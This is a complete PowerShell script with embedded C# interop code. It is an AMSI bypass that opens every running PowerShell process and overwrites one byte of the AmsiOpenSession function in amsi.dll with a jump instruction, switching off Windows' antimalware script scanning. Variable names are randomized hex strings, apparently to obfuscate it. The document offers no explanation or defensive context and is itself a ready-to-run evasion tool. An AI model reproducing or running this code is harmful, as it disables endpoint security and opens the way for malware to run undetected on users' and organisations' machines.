Write-Host "===NA==="
$8c4501569a4d484e94ce6b50d4e69398 = Read-Host "Press Enter to continue"
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class NAms
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@
function moai {
    param (
        [int]$processId
    )

    Write-Host "process ID: $processId"
    $6a7c8e169a1543869115ed6c1014bcf1 = [byte]0xEB
    $d76199e4ef934d029127bfda34fdc314 = New-Object NAms+OBJECT_ATTRIBUTES
    $3558ad3b5f60485fbf2d53673dacce60 = New-Object NAms+CLIENT_ID
    $3558ad3b5f60485fbf2d53673dacce60.UniqueProcess = [IntPtr]$processId
    $3558ad3b5f60485fbf2d53673dacce60.UniqueThread = [IntPtr]::Zero
    $d76199e4ef934d029127bfda34fdc314.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($d76199e4ef934d029127bfda34fdc314)
    $3582d4f61fe442799ebf1bc884a2b2a1 = [IntPtr]::Zero
    $6459d58b44a9462a8880798db9eec5ca = [NAms]::NtOpenProcess([ref]$3582d4f61fe442799ebf1bc884a2b2a1, [NAms]::PROCESS_VM_OPERATION -bor [NAms]::PROCESS_VM_READ -bor [NAms]::PROCESS_VM_WRITE, [ref]$d76199e4ef934d029127bfda34fdc314, [ref]$3558ad3b5f60485fbf2d53673dacce60)
    if ($6459d58b44a9462a8880798db9eec5ca -ne 0) {
        Write-Host "Fail"
        return
    }
    $23c9b422e47f4f72b81b97a9e3538da5 = [NAms]::LoadLibrary("amsi.dll")
    if ($23c9b422e47f4f72b81b97a9e3538da5 -eq [IntPtr]::Zero) {
        Write-Host "Fail"
        [NAms]::NtClose($3582d4f61fe442799ebf1bc884a2b2a1)
        return
    }
    $a535207fc3f3460fb1acbe8148ed0871 = [NAms]::GetProcAddress($23c9b422e47f4f72b81b97a9e3538da5, "AmsiOpenSession")
    if ($a535207fc3f3460fb1acbe8148ed0871 -eq [IntPtr]::Zero) {
        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
        [NAms]::NtClose($3582d4f61fe442799ebf1bc884a2b2a1)
        return
    }
    $b0dc642d0ce94efbbb5d5023e12ae3f9 = [IntPtr]($a535207fc3f3460fb1acbe8148ed0871.ToInt64() + 3)
    $e37739c68287439ca99ce88a863547d2 = [UInt32]0
    $eaad4be5200645df88966aff312aaac1 = [UIntPtr]::new(1)  # Correct conversion to UIntPtr
    $ed304dace6f140a7af3a654d259d4110 = [NAms]::VirtualProtectEx($3582d4f61fe442799ebf1bc884a2b2a1, $b0dc642d0ce94efbbb5d5023e12ae3f9, $eaad4be5200645df88966aff312aaac1, [NAms]::PAGE_EXECUTE_READWRITE, [ref]$e37739c68287439ca99ce88a863547d2)
    if (-not $ed304dace6f140a7af3a654d259d4110) {
        Write-Host "Fail"
        [NAms]::NtClose($3582d4f61fe442799ebf1bc884a2b2a1)
        return
    }
    $bb360891eede4b89badf0b78ade203da = [System.UInt32]0
    $6459d58b44a9462a8880798db9eec5ca = [NAms]::NtWriteVirtualMemory($3582d4f61fe442799ebf1bc884a2b2a1, $b0dc642d0ce94efbbb5d5023e12ae3f9, [byte[]]@($6a7c8e169a1543869115ed6c1014bcf1), 1, [ref]$bb360891eede4b89badf0b78ade203da)
    if ($6459d58b44a9462a8880798db9eec5ca -eq 0) {
        Write-Host "ok"
    } else {
        Write-Host "Fail"
    }
    $178ebca7bbc04e92a299842aeb1a5739 = [NAms]::VirtualProtectEx($3582d4f61fe442799ebf1bc884a2b2a1, $b0dc642d0ce94efbbb5d5023e12ae3f9, $eaad4be5200645df88966aff312aaac1, $e37739c68287439ca99ce88a863547d2, [ref]$e37739c68287439ca99ce88a863547d2)
    if (-not $178ebca7bbc04e92a299842aeb1a5739) {
        Write-Host "Fail"
    }
    [NAms]::NtClose($3582d4f61fe442799ebf1bc884a2b2a1)
}
function mapsh {
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        moai -processId $_.Id
    }
}
Write-Host "Starting script..."
mapsh
Write-Host "Completed."